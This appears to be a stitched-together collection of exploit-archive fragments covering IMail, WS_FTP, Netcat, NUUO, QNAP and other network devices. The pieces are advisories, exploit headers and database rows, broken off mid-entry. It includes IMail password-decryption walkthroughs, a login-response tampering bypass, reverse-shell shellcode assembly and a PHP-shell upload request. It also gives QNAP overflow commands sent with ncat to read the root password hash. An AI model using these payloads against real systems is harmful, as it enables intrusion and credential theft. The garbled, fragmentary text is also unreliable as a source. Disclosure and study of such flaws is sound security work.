in the course of a very limited infrastructure audit. Very little time was
spent on the affected product.
The Web Manager can be used with read only permission to check the
configuration on the device (e.g. VLANs, Port status). Additionally the Web
Manager can be used with read and write permission to configure the device.
Using the identified vulnerability a low privileged user having read only
permission can elevate his privileges to contain read and write permissions.
Vulnerability overview/description:
The Web Manager contains a login form to authenticate a user. The Web Manager
offers different levels of privilege (e.g. read only permission, read and
write permission, debugging permission).
The login attempt is checked through a CGI binary, but the response of the
binary is validated at the client side via JavaScript. An attacker can
intercept and modify the response of the binary, thus achieving authentication
and the desired level of authorization. No further validation is performed by
the Web Manager.
Proof of concept:
The login generates the following request to the server:
interf=WEB&bidx=1&unam=root&pawo=&plev=0
This request triggers a CGI binary, which validates the login attempt and
returns the following response:
<xml>
<!-- last change: 17.04.2012 -->
<!-- returned at uptime of 141056 seconds -->
<header>
<version>V0.1</version>
<user>XYZ</user>
<date>2012/05/29 17:28:00</date>
</header>
<response>
<par name=""cmd"" type=""STRING"" >
<val>login</val>
</par>
<par name=""result"" type=""UNSIGNED"" >
<val>255</val>
</par>
<par name=""lunam"" type=""STRING"" >
<val>root</val>
</par>
<par name=""liid"" type=""STRING"" >
<val>0</val>
</par>
<par name=""rhost"" type=""STRING"" >
<val>192.10.100.136</val>
</par>
<par name=""a_s_b"" type=""STRING"" >
<val>0_0_1</val>
</par>
</response>
</xml>
The parameter ""result"" informs the client about the properness of the provided
login credentials.
The parameter can correspond to the following values:
255 login failed
1 login with read only permission
2 login with read and write permission
3 login with debugging permission
For example, if the value of the parameter ""result"" is changed to 3, the user
gets logged in with debugging permissions.
Vendor contact timeline:
2013-09-10: Contacting vendor
2013-09-11: Sending advisory and proof of concept exploit via encrypted
channel.
2013-09-11: Vendor acknowledges receipt of advisory.

2014-02-07: Conference call: Clarifying pending questions regarding the fixed
version.
2014-02-28: SEC Consult releases coordinated security advisory.
Solution:
Update to the most recent firmware version 10.3.2
Workaround:
All accounts with read only permissions should be disabled on the device.

/*OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*/","Ipswitch IMail is reported to use a weak encryption algorithm when obfuscating saved passwords. A local attacker who has the ability to read the encrypted passwords may easily derive the plaintext password if the username that is associated with the password is known.
A local attacker may exploit this weakness to disclose user credentials.
*       IpSwitch IMail Server <= ver 8.1 User Password Decryption
*       by Adik < netmaniac[at]hotmail.KG >
*       IpSwitch IMail Server uses weak encryption algorithm to encrypt its user passwords. It uses
*       polyalphabetic Vegenere cipher to encrypt its user passwords. This encryption scheme is
*       relatively easy to break. In order to decrypt user password we need a key. IMail uses username
*       as a key to encrypt its user passwords. The server stores user passwords in the registry under the key
*       ""HKEY_LOCAL_MACHINE\SOFTWARE\IpSwitch\IMail\Domains\<domainname>\Users\<username>\Password"".
*       Before decrypting password convert all upper case characters in the username to lower case
*       characters. We use username as a key to decrypt our password.
*       In order to get our plain text password, we do as follows:
*       1) Subtract hex code of first password hash character by the hex code of first username character.
*          The resulting hex code will be our first decrypted password character.
*       2) Repeat above step for the rest of the chars.
*       Look below, everythin is dead simple ;)
*       eg:
*       USERNAME:               netmaniac
*       PASSWORDHASH:   D0CEE7D5CCD3D4C7D2E0CAEAD2D3

2004-07-13,Local,Linux,SEKINE Tatsuo,IM-Switch,Insecure Temporary File Handling Symbolic Link,source: https://www.securityfocus.com/bid/10717/info,"IM-Switch Insecure Temporary File Handling Symbolic Link VulnerabilityIt is reported that im-switch is prone to a local insecure temporary file handling symbolic link vulnerability. This issue is due to a design error that allows the application to insecurely write to a temporary file that is created with a predictable file name.
The im-switch utility will write to this temporary file before verifying its existence; this would facilitate a symbolic link attack.
An attacker may exploit this issue to corrupt arbitrary files. This corruption may potentially result in the elevation of privileges, or in a system wide denial of service.

//Cr�ation de la socket
//GetHostByName()
//Preparation de la struct sockaddr_in","A vulnerability has been identified in the YaSoft Switch Off software package when handling message requests. The buffer overrun condition exists in the 'swnet.dll' module of the software due to insufficient bounds checking performed by the affected component. The overflow may be caused by sending an excessively long 'message' parameter to the application. This may make it possible for a remote user to execute arbitrary code through a vulnerable server.

It has been reported that HP Procurve Switches are vulnerable to a denial of service attack, when used in a ""stack"" configuration. It is possible for an attacker to reset member switches by issuing a device reset command to a vulnerable device. Vulnerable devices do not require authentication before accepting this command.
It should be noted that the web interface is not enabled by default."

The web messaging server is vulnerable to a buffer overflow. When the server receives a request for HTTP version 1.0, and the total request is 96 bytes or greater, a buffer overflow occurs. This could result in the execution of attacker-supplied instructions, and potentially allow an attacker to gain local access.

# WS_FTP Server 2.0.3 STAT proof-of-concept exploit
# By andreas@defcom.com (C)2001
# There are a couple of things screwing up this exploit. First, the
# total number of bytes we control in the area where ESP is pointing,
# corresponds to the number of bytes in the domain name. So, to make sure
# it works on as many systems as possible, Im only using 2 bytes here.
# So, we have to jump back through the buffer... Fun.. :)
# Second, the number of bytes needed to overwrite EIP is dependant on the
# number of bytes in the server name.
# Third, the stack has to be moved to the heap, because there is no
# good place on the stack, it just ends with CreateFile overwriting stuff.
# Im using a ""jump esp"" in shlwapi.dll(0x70beed87) as the return address,
# change this if it does not work on your system.
# get servername and length of domain","WS_FTP Server, a popular FTP server for Microsoft Windows platforms, is vulnerable to a buffer overflow condition when a user submits a specially crafted legitimate FTP command. WS_FTP Server by default runs as a SYSTEM service.
If a logged in user submits a 'STAT' command along with arbitrary characters (approx 479 bytes) to a host running WS_FTP Server, this could result in the overwriting of stack variables, including the return address, and potentially the execution of arbitrary code with SYSTEM privileges.

# WS_FTP Server 2.0.2 DELE proof-of-concept exploit
# By andreas@defcom.com and janne@defcom.com (C)2001","WS-FTP Server is vulnerable to malicious remote user input argumenting multiple FTP commands received from anonymously connecting clients.
An attacker may supply a long sequence of characters as an argument to any of the affected commands. If the length of the argumenting string exceeds the size of its input buffer, the excess data will overwrite other variables on the stack and the stack frame itself.
As a result, an attacker can replace the affected function's return address with a pointer to malicious shellcode, allowing arbitrary code to run with SYSTEM privilege.

2000-08-30,Remote,Windows,Timescape,Ipswitch IMail 6.x,File Attachment,source: https://www.securityfocus.com/bid/1617/info,"IPSWITCH ships a product titled IMail, an email server for usage on NT servers serving clients their mail via a web interface. To this end the IMail server provides a web server typically running on port 8383 for it's end users to access. Via this interface users may read and send mail, as well as mail with file attachments. Certain versions of IMail do not perform proper access validation however resulting in users being able to attach files resident on the server. The net result of this is users may attach files on the server to which they should have no access. This access is limited to the user privileges which the server is being run as, typically SYSTEM.
It should be noted that once a user attachs the files in question the server deletes them.
Here is a sample mail header sent by IMAIL web services which
has an attachment. Please note that this is line wrapped for readability.

http://www.ussrback.com","IMail keeps the encrypted passwords for email accounts in a registry key, HKLM\SOFTWARE\Ipswitch\Imail\Domains\(DomainName)\Users\(UserName), in a string value called ""Password"". The encryption scheme used is weak and has been broken. The following description of the mechanism used is quoted from Matt Conover's post to Bugtraq, linked to in full in the Credits section.
ENCRYPTION SCHEME Take the lowercase of the account name, split it up by letter and convert each letter to its ASCII equivalent. Next, find the difference between each letter and the first letter. Take each letter of the password, find it's ASCII equivalent and add the offset (ASCII value of first char of the account name minus 97) then subtract the corresponding difference. Use the differences recursively if the password length is greater than the length of the account name. This gives you the character's new ASCII value. Next, Look it up the new ASCII value in the ASCII-ENCRYPTED table (see http://www.w00w00.org/imail_map.txt) and you now have the encrypted letter.
Example:
Account Name: mike
m = 109
i = 105
k = 107
e = 101
Differences:
First - First: 0
First - Second: 4
First - Third: 2
First - Fourth: 8
Unencrypted Password: rocks
r = 114
o = 111
c = 99
k = 107
s = 115
(ASCII value + offset) - difference:
offset: (109 - 97) = 12
(114 + 12) - 0 = 126
(111 + 12) - 4 = 119
(99 + 12) - 2 = 109
(107 + 12) - 8 = 111
(115 + 12) - 0 = 127
126 = DF
119 = D8
109 = CE
111 = D0
127 = E0
Encrypted Password: DFD8CED0E0
The decryption scheme is a little easier. First, like the encryption scheme, take the account name, split it up by letter and convert each letter to its ASCII equivalent. Next, find the difference between each letter and the first letter. Now split the encrypted password by two characters (e.g., EFDE = EF DE) then look up their ASCII equivalent within the ASCII-ENCRYPTED table (see http://www.w00w00.org/imail_map.txt). Take that ASCII value and add the corresponding difference.Look this value up in the ascii table. This table is made by taking the ASCII value of the first character of the account name and setting it equal to 'a'.

Patch:
Ipswitch was notified of this advisory last week, and they have not
responded.  They released a never version afterwards, but we cannot
confirm whether or not this latest version, 6.01 fixes the vulnerability.
Their site says:
This patch fixes problems with POP server and IAdmin application,
including external database authentication problems and possible
password corruption problems.
Until we have positive confirmation, you can set an ACL on each registry
key containing the password to prevent normal users (while still allowing
IMail) from viewing other users' passwords.  You are safe to remove read
permissions on these registry keys--they will not affect IMail (as it
doesn't run with user privileges).

# }","On the 15th of august 2009, at the HAR2009 conference, the existence of a backdoor password in Accton-based switches was revealed by Edwin Eefting, Erik Smit and Erwin Drent [1][2]. Even though this is a >365-day exploit, it does not seem to be listed in any of the vulnerability databases. Also, I could not find a patch for any of the vulnerable devices. According to the researchers, they contacted 3Com and Accton, but did not receive a response. I have a vulnerable 3Com 3812 in my lab and contacted the 3Com SRT months ago, but did not receive a response either. This seems to be a forgotten bug...
The Accton company builds switches, which are rebranded and sold by several manufacturers (including 3Com, Dell, SMC, Foundry and EdgeCore). The researchers list at least the 3Com 3812, 3Com 3870 and Edgecore ES4649 as vulnerable[3], but other vendors are affected as well. For example, I could also reproduce the behavior on a Dell PowerConnect 5224 switch.
The backdoor password can be calculated if you have the switch MAC-address, which can be obtained via ARP or SNMP (if you know the community string). It seems to work on all management interfaces: telnet, ssh and http. If you don't know the MAC-address but can guess the OUI, brute forcing the password is probably feasible as well. A perl script (accton.pl) to calculate the password from the MAC address is available at [4].
I'm hoping as a result of this e-mail, this will end up in vulnerability databases, scanners etc. I believe more vulnerable devices will show up as people start scanning their networks.
A sample SSH session with my 3Com 3812, running the latest available firmware (2.00):

# Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
# Tested on: Windows XP SP3 (Windows version does not matter)
# Description:
# So I reverse engineered the IMail password decryption function in
# IMailsec.dll, located at 0x00563130.
# In order to decrypt correctly, you must have the correct username,
# because it is used as a key.
# All usernames and passwords are stored in registry, which can be
# found at:
# HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail\Domains\[domain name]\Users
# Every registry key under ""Users"" has a string value named ""Password"",
# in there you'll find the encrypted password.
# By default, Internet Guest Account is granted with ""Full Control"" to
# the IMail registry, and its directory.  That means if an attacker
# manages to gain code execution (ie.via a web app bug), IMail can be
# his/her next playground.  And IMail users may not be safe.
# Demo:
# sinn3r@bt4:~$ ./iMailDecrypt.py admin C8D3D19AA094
# Ipswitch IMail Server - IMAP4 Server (IMail 11.01) Password Decryptor
# coded by sinn3r  -  x90.sinner{at}gmail.c0m
# [*] Password = god123
# Responsible Disclosure Timeline:
# 1/21/2010  -  IMail vendor contacted
# 1/26/2010  -  Got a reply from the vendor for more vulnerability
#clarfication.  No fix yet.
# 2/02/2010  -  Received another reply from the vendor: Issues logged for
#additional research.  No plans for immediate changes.
#A public advisory was also suggested by the vendor as
#reference in their tech/KB article.
# 2/04/2010  -  Public Disclosure.  Vendor informed again.

0x01 : Vendor Description of Software
""The Award-winning IMail Server is a proven email messaging solution for small and mid-sized businesses.
Reliable, scalable and versatile, IMail Server is an affordable choice that meets the messaging needs
of small and medium sized businesses. Unlike complicated and more expensive messaging solutions, IMail
Server delivers a quick and easy installation. As a scalable, standards-based, email server with Webmail,
optional integration with Microsoft Exchange ActiveSync®, SMTP, POP, IMAP, LDAP, and List Server, IMail
users can send and receive email using any standards-based client, including Microsoft Outlook®,
Outlook Express®, or Eudora®. Or, users can access email from anywhere via IMail's customizable Web
messaging, available in eight languages.
Designed to place minimal ongoing maintenance burden on network administrators, IMail can authenticate
users from its own database, an active directory database, or from any ODBC-compliant data store, making
life easier for the busy administrator. IMail Server also delivers a quick and easy installation or upgrade
process.""
0x02 : Vulnerability Details
1. By default, IMail allows Internet Guest Account to have ""Full Control"" to the following registry key,
including its subkeys and values. As well as the default IMail directory:
HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail
C:\Program Files\Ipswitch\IMail\
2. The IMail password decryption algorithm implemented in IMailsec.dll is also reversible.

#  The programmer has made an extreamly stupid mistake.
#  He checks the arg's first byte, if it is 0x22( "" ),then invoke strcpy,
#  else strncpy.
#  the buffer overflow takes place when the strcpy is called.
#  But the strncpy is also vulnerable,because it just likes this: strncpy(dest, src, strlen(src));
#  So, whether the command was started with a '""' or not, the stack overflow will take place immediately.
#  Multiple SEARCH COMMAND is vulnerable,in this case, we use ""SEARCH ON"".
#  But others like ""SEARCH BEFORE"" command will also trigger the overflow.
#  NOTES: To trigger the Vuln, there must be at least one mail in the mailbox!!

* Target         : Ipswitch IMAIL Server IMAPD 7.13 - 8.20 exploit
* Site           : http://www.ipswitch.com
* Found by       : iDEFENSE Security (http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=243)
* ----------------------------------------
* Exploit date   : 31.03.2007
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows 2000 SP4 and Windows XP ALL
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info: Well, this is the realization of the IMAIL IMAPd 'LOGIN' buffer overflow vulnerability.
*   The version provided by kcope uses SEH overwrite method, which doesn't work on Windows XP SP2,
*   so i have written the exploit that overwrites EIP and then execute the shellcode.
*   I have tested this exploit on the all versions of Imail from 7.13 to 8.20, versions < 7.13 are also vulnerable,
*   but i don't have them to test the exploit, Windows 2000 SP4 and Windows XP SP0-SP2.
*   Here you need to select the OS and the IMAIL version, that is not good, but anyone with some brain can
*   easily modify the code to get version of Imail from banner or obtain 'data segment' value without knowing
*   the Imail version.

// JMP to EAX = Results in a Corrupted Stack
// so instead we POP EBP, RET to restore pointer and then return
// this causes code procedure to continue
// Another overflow can be achieved by using an overly long buffer after RCPT TO: on 8.15 systems
// After around 560 bytes or so EIP gets overwritten.  But this method is easier to exploit and it works
// On all versions from 8.x to 2006 (9.x?)
// Setup Payload Options
// Dont forget to add the trailing characters to set up stack overflow
// Connect to SMTP Server and Setup Up Email

Software Hole discovered by iDEFENSE
POC written by nolimit and BuzzDee
First, some information for the few of you that know how this stuff works.
The reason you see no SP2 or 2003 offsets is because of Windows SEH checks.
Thats right, in this one situation, They've stopped hackers from exploiting the machine.
At least with as much research as I care to do. The problem lies in the
fact that only alpha numeric memory addresses can be used in this exploit.
So what lies within the few regions of memory that is alpha numeric safe? Only system
DLLs.(Well also a 7000 byte TEB block section, which doesn't really produce much either).
So any SEH address overwritten that points to a system DLL  will fail past Windows XP SP2.
From what I've read and the few tricks I've tried, Theirs no way currently to get around the
protection In my situation.
For the sharp ones, you've maybe noticed that XP SP1 isn't an offset. This is because
of two reasons, While I've developed along with skylined an alpha numeric shellcode
to handle the stack protections in Windows XP/2K3, I don't think he's ready to release
it yet.So, when It does come around, you can use that and re-adjust the stack accordingly
for proper exploitation of SP1.
The size we have on the stack is too small for a bindshell, but big enough for a reverse shell!
So I use ALPHA2's decoder and encoder (modified) to write info to reverse shell, then encode it.
visit http://www.edup.tudelft.nl/~bjwever/documentation_alpha2.html.php for more information.
Now, for the ""impact assessment"".
Because this doesn't work on SP2 / 2003, the 53 million users that use Imail should
mostly be safe from complete ownage. But, Do not let this fact let you not patch your
server! This exploit, sent with any offset, will still crash your IMAP server!
With that said, Thier is still a small amount of servers online that run one of these
targetted offsets, and therefore can be exploited. I hope this Proof Of Concept is the
push administrators need to patch their software.
For Da Skiddies: this exploit is teh oww kay. I g0t a f3w shells0rs.

// milw0rm.com [2004-12-26]","Netcat v1.1, ""-e"" Switch, Remote Buffer Overflow Exploit v0.1
Homepage..........: http://www.securityfocus.com/tools/139/scoreit
Affected versions.: v1.1
Fix...............: Actually none, Hobbit is warned 1 month+ ago, and looks like
to not act, we let him to spread a backdoor :)
Risk..............: Highly critical.
-Almost everything loaded as ""nc ... -e ..."" is vulnerable
-Educational tools such as the uw-imapd (http://www.washington.edu/imap/) contains no port listener,
if it's loaded with netcat (ie: nc -L -p 143 -t -e imapd.exe
25  -t -e pop3d.exe etc..vulnerable..)
this small example show you the large impact of this hole.
-Tools build on netcat , I guess are vulnerable , such as the netcat with
authentification or others tools based on netcat without a security check on src.
-Next time you run netcat -e , be sure of what you run because as said Hobbit,
the ""-e"" switch is really DANGEROUS!! :DDD
Compilation.......: 101_ncat.cpp ......... Win32 (MSVC,cygwin)
101_ncat.c ........... Linux (FreeBSD,etc..)
Greetings.........: Nima Majidi, Behrang Fouladi (cool teammates ;p)
DiabloHorn, kimatrix (KD-Team guys)
Nicolas Waisman, MMiller(skape), H.D Moore, BJWever (for the help)
Brett Moore (for all help and specially there
for suggesting me that way of MSVCRT.system call
; call system()
mov eax,1656E64h  ; mov cmd + 01010101 to eax
sub eax,01010101h ; sub 01010101
push eax ; Push cmd on stack with our null byte :)
push esp ; Location to cmd
call ebp ; Call system()
via that way you can push on the stack ""\x00""cmd without
breaking your payload.
Because in the public shellcode that he published on mailinglist
; Call system()
push  20646D63h  ; Push cmd on stack, null exists from above
push  esp    ; Location to cmd
call  ebp    ; Call system()
Sure it's smaller to push direclty ""\x20""cmd but
MSVCRT.system was also grabbing invalid unicode chars
before ""\x20""cmd including esp pointing to cmd (windows bug ?:>)(on w2k sp4 server).
Else to bypass a bad char , I do a small change ,adding 6 nop,
to kick out ""\x0A"" bugging there for netcat and prolly more.
This to finally say that the size of the shellcode is now 220 bytes instead
of 205 (still awesome for a reversecmd generic win32 shellcode)
Tested working on W2k SP4,XP all SP. Excellent job by Brett Moore wich I throw all credits
because this shellcode is the brain of that exploit ;)
Extra.............: !All tests were made on nc.exe from http://www.securityfocus.com/tools/139/scoreit!
!All tests were made loading netcat: nc -L -p 143 -t -e c:\imapd.exe!
(hoping the processus wont change if you load differently netcat, I dont think, else update urself!
!See in the code if you need the shellcode in ASM format, really useful peace of code, thanx to bmoore and me!
!Don't use ip with #0 as '127.0.0.1' , this will break the payload.
Bug discovery.....: class101
Exploit code......: class101 at www.hat-squad.com - dfind.kd-team.com - #n3ws EFnet
Quizz.............: Wich crew is enough stupid to spread perl worm codes ?

// milw0rm.com [2004-08-18]","* IpSwitch IMail Server <= ver 8.1 User Password Decryption
* by Adik < netmaniac hotmail KG >
* IpSwitch IMail Server uses weak encryption algorithm to encrypt its user passwords. It uses
* polyalphabetic Vegenere cipher to encrypt its user passwords. This encryption scheme is
* relatively easy to break. In order to decrypt user password we need a key. IMail uses username
* as a key to encrypt its user passwords. The server stores user passwords in the registry under the key
* ""HKEY_LOCAL_MACHINE\SOFTWARE\IpSwitch\IMail\Domains\<domainname>\Users\<username>\Password"".
* Before decrypting password convert all upper case characters in the username to lower case
* characters. We use username as a key to decrypt our password.
* In order to get our plain text password, we do as follows:
* 1) Subtract hex code of first password hash character by the hex code of first username character.
*    The resulting hex code will be our first decrypted password character.
* 2) Repeat above step for the rest of the chars.
* Look below, everythin is dead simple ;)
* eg:
* USERNAME:  netmaniac
* PASSWORDHASH: D0CEE7D5CCD3D4C7D2E0CAEAD2D3
* --------------------------------------------
* D0 CE E7 D5 CC D3 D4 C7 D2 E0 CA EA D2 D3 <- password hash
* - 6E 65 74 6D 61 6E 69 61 63 6E 65 74 6D 61 <- hex codes of username
* n  e  t  m  a  n  i  a  c  n  e  t  m  a <- username is a key
* -----------------------------------------
* 62 69 73 68 6B 65 6B 66 6F 72 65 76 65 72 <- hex codes of decrypted password
* b  i  s  h  k  e  k  f  o  r  e  v  e  r <- actual decrypted password
* pwdhash_hex_code  username_hex_code  decrypted_password
* ------------------------------------------------------------------
*   D0   -  6E (n)   = 62 (b)
*   CE   -  65 (e)   = 69 (i)
*   E7   -  74 (t)   = 73 (s)
*   D5   -  6D (m)   = 68 (h)
*   CC   -  61 (a)   = 6B (k)
*   D3   -  6E (n)   = 65 (e)
*   D4   -  69 (i)   = 6B (k)
*   C7   -  61 (a)   = 66 (f)
*   D2   -  63 (c)   = 6F (o)
*   E0   -  6E (n)   = 72 (r)
*   CA   -  65 (e)   = 65 (e)
*   EA   -  74 (t)   = 76 (v)
*   D2   -  6D (m)   = 65 (e)
*   D3   -  61 (a)   = 72 (r)
* ------------------------------------------------------------------
* I've included a lil proggie to dump all the usernames/passwords from local machine's registry.
* Have fun!

# Arteco Web Client DVR/NVR 'SessionId' Cookie Brute Force Session Hijacking Exploit
# Vendor: Arteco S.U.R.L.
# Product web page: https://www.arteco-global.com
# Affected version: n/a
# Summary: Arteco DVR/NVR is a mountable industrial surveillance server
# ideal for those who need to manage IP video surveillance designed for
# medium to large installations that require high performance and reliability.
# Arteco can handle IP video sources from all major international manufacturers
# and is compatible with ONVIF and RTSP devices.
# Desc: The Session ID 'SessionId' is of an insufficient length and can be
# exploited by brute force, which may allow a remote attacker to obtain a
# valid session, bypass authentication and disclose the live camera stream.
# Tested on: Microsoft Windows 10 Enterprise
#            Apache/2.4.39 (Win64) OpenSSL/1.0.2s

# CVE: N/A
# TRA: https://www.tenable.com/security/research/tra-2018-25
# Description:
# A stack buffer overflow exists in the cgi_system binary. The error occurs

# As written, this exploit enables Telnet.
# Executes a command via the stack buffer overflow in cookie parsing. The command
# is executed via 'system' as root. The overlow logic is like so:
# address 1: 405e2e34 - load system into r3 and address 2 into lr

# address 2: 406037cc - load the system command into r0. Jump to system.

Vulnerability Description
Recetly, I found an Arbitrary File Upload Vulnerability in 'NUUO NVRmini2' program, NVRmini2 is widely used all over
the world.
Vulnerable cgi: /upload.php
<?php
echo $_FILES['userfile']['name'];
copy($_FILES[""userfile""][""tmp_name""],$_FILES['userfile']['name']);
As the code above, no any filter, so we can upload a php shell directly to the web server.
POC  EXP
1. Upload 'nuuonvr.php' to web root path:
POST /upload.php HTTP/1.1
Host: 192.168.10.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en

# The Uniview NVR web application does not enforce authorizations on the main.cgi file when requesting json data.
# It says that you can do anything without authentication, however you must know the request structure.
# In addition, the users' passwords are both hashed and also stored in a reversible way
# The POC below remotely downloads the device's configuration file, extracts the credentials
# and decodes the reversible password strings using my crafted map
# It is worth mention that when you login, the javascript hashes the password with MD5 and pass the request.
# If the script does retrieve the hash and not the password, you can intercept the request and replace the generated
# MD5 with the one disclosed using this script

===[ 1. Classic Heap Overflows ]===
1. Both the tags ""u"" (user) and ""p"" (password) suffer of heap overflow, that alone allows us to overwrite wilderness top chunk size.
2. The tag ""pp"" (sysApp) suffer of stack overflow, that alone allows to us to overwrite libc_argv[0].

*** stack smashing detected ***: $1$$CoERg7ynjYLsj2j4glJ34. terminated
Aborted
As we can see above, the implemented GLIBC heap/stack protections works quite sufficient, pretty much nothing interesting can be achieved.
But, when we start to combining vulnerabilities, flaws and near functions with each other, things starting to get a bit more interesting.
===[ 3. Heap Feng Shui with Heap #1 and #2 Overflow ]===
One of the first functions that runs in the CGI, is CGI_Get_Input(), this function takes all our input to the CGI and allocates memory on the heap for later use with CGI_Find_Parameter(); This allow us to create junk memory chunks more or less wherever we would like to have them, have them freed, and then later have them allocated for our use.
The for() loop with char ""B"" will create used and freed space before ""p"" at heap by CGI_Get_Input();
The upcoming calloc() for ""u"" will use this space, and the content in ""u"" will be copied here and overflow into ""p"":s heap chunk header.
[The abort() happens in <fgetpwent+402>: malloc() from Get_Exact_NAS_User_Name() call, and not in ""p"":s calloc()]
*** glibc detected *** /home/httpd/cgi-bin/cgi.cgi: corrupted double-linked list: 0x0806b154 ***
Below I will demonstrate another interesting combination found while exploring,
that easily can be exploited remotely without credentials and without any prior knowledge of the remote target.
===[ 4. ""Heack Combo"" (Heap / Stack Combination) Overflow ]===
We will here combine the ""GLIBC detected"" abort message in GNU LIBC thatâ€™s triggered by an Heap Overflow, together with base64 encoded request string to cgi.cgi in QNAP devices, where the internal b64_Decode() function will (right after the heap overflow) be called and do an stack overwrite of address pointer for libc_argv[0], with the address we choose, which will allow us to read a string almost anywhere.
In this PoC we are using the address for the heap loaded admin (root) /etc/shadow password, to remotely read this string for displaying instead of the program name.
The critical part is to correctly align the request with the address pointer for libc_argv[0], and below you will find guidance for success.
Notes:
1. Sending 0x00-0xff to the stack will work just fine, since the request for ""p"" will be base64 decoded. (theoretically, we could rewrite the stack as how we would like to have it)
2. Iâ€™m using HTTPS/SSL to have some privacy while fuzzing, only to show some people that HTTPS/SSL donâ€™t make them secure by default. (HTTP works of course too)
3. Right before and after the address pointer for libc_argv[0], we have (harmless?) segfaults in strlen() / getenv() due to reading of invalid addresses.
4. The ""\nHost: Qâ€ is needed with HTTPS/SSL, could be removed when using HTTP, otherwise the PoC sometimes may not work as expected. *sigh*
5. Since the given pattern for reading is static, automated tool are quite easy to develop. (with slightly adjustment of the offset for correctly reading)
6. Fingerprinting is extremely easy with the request: ""GET /cgi-bin/authLogin.cgi HTTP/1.0"" (provides XML list with all relevant details)
7. This PoC will not work with devices who has ASLR enabled for heap. *doh*
Credits:
QNAP, to the combination of heap overflow with base64 decoded stack overwrite, for letting us write where we want to read.
GLIBC, who give us quite vital information to calculate with, that allow us to point our reading correctly, and then reading what we want.
Now to the demonstration.
[==== (1) ====]
[Four and more bytes off below the address pointer for libc_argv[0]]
You should start with fairly low number in the for() loop (around 2000 - 3000 should be fine) and work your way up to the breaking point between #1 and #2.
Note:
In the example we start with 4464 in the for() loop, only to clearly show the breaking point between #1 and #2.
Example:
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4464;i++));do echo -en ""\xff"";done) ; AP=$""\x41\x41\x41\x41""; echo -en ""$QN$AP"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n""  | ncat --ssl 192.168.5.7 443
HTTP/1.1 200 OK
Date: Sun, 08 Jan 2017 11:40:06 GMT
*** glibc detected *** cgi.cgi: free(): invalid next size (normal): 0x0806e508 ***
[==== (2) ====]
[Three or two bytes off below the address pointer for libc_argv[0]]
Note now the below ""*** glibc detected ***"" - it doesnâ€™t write the program name as above in #1, this is very important first step to look for.
Note:
Two bytes off can sporadicly generate segfault, so donâ€™t be fooled to believe you are in #3.
Recommending firstly to exactly find the first breaking point between #1 and #2 (program name).
Example (three off below):
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4465;i++));do echo -en ""\xff"";done) ; AP=$""\x41\x41\x41\x41""; echo -en ""$QN$AP"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"" | ncat --ssl 192.168.5.7 443

*** glibc detected *** : free(): invalid next size (normal): 0x0806e508 ***
[==== (3) ====]
[One byte off below the address pointer for libc_argv[0]]
Very important step, segfault in strlen() and we need now add one more byte to correctly overwrite the address pointer for libc_argv[0]
Example (one off below):
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QN=$(for((i=0;i<4467;i++));do echo -en ""\xff"";done) ; AP=$""\x41\x41\x41\x41""; echo -en ""$QN$AP"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"" | ncat --ssl 192.168.5.7 443

[==== (4) ====]
The address we looking for can be calculated from above heap message in #2 (0x0806e508) and subtracted with below offset.
Fixed offset (more or less)
NASX86: 0x16b2
NASARM: 0x1562
NASX86 example:
If we subtract the offset: 0x0806e508 - 0x16b2 = 0x0806ce56; We should directly read the hash. (if not, adjust the reading slightly with the offset)
Example (correctly aligned):
$ echo -en ""GET /cgi-bin/cgi.cgi?u=admin&p=`QNAP=$(for((i=0;i<4468;i++));do echo -en ""\xff"";done) ; PWNED=$""\x56\xce\x06\x08""; echo -en ""$QNAP$PWNED"" | base64 -w 0` HTTP/1.0\nHost: Q\n\n"" | ncat --ssl 192.168.5.7 443

>> Summary:
NUUO is a vendor of Network Video Recording (NVR) systems for surveillance cameras. These NVR are Linux embedded video recording systems that can manage a number of cameras and are used worldwide by public institutions, banks, SME's, etc. They also provide a software package to NETGEAR that adds network video recording and monitoring capabilities to the well known NETGEAR ReadyNAS Network Attached Storage systems.
The web interface contains a number of critical vulnerabilities that can be abused by unauthenticated attackers. These consist of monitoring backdoors left in the PHP files that are supposed to be used by NUUO's engineers, hardcoded credentials, poorly sanitised input and a buffer overflow which can be abused to achieve code execution on NUUO's devices as root, and on NETGEAR as the admin user.
Although only the NVRmini 2, NVRsolo, Crystal and ReadyNAS Surveillance devices are known to be affected, it is likely that the same code is used in other NUUO devices or even other third party devices (the firmware is littered with references to other devices like NUUO Titan). However this has not been confirmed as it was not possible to access all NUUO and third party devices that might be using the same code.
A special thanks to CERT/CC (https://www.cert.org/) for assistance with disclosing the vulnerabilities to the vendors [1]. Metasploit exploits for #1, #2 and #3 have been released.
>> Technical details:
Vulnerability: Improper Input Validation (leading to remote code execution)
CVE-2016-5674
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected
The web inteface contains a hidden file named __debugging_center_utils___.php that improperly sanitises input to the log parameter, which is passed to the PHP system() call (snippet below):
function print_file($file_fullpath_name)
$cmd = ""cat "" . $file_fullpath_name;
echo $file_fullpath_name . ""\n\n"";
system($cmd);
<?php
if (isset($_GET['log']) && !empty($_GET['log']))
$file_fullpath_name = constant('LOG_FILE_FOLDER') . '/' . basename($_GET['log']);
print_file($file_fullpath_name);
else
die(""unknown command."");
The file can be accessed by an unauthenticated user, and code execution can be achieved with the following proofs of concept:
- ReadyNAS Surveillance:
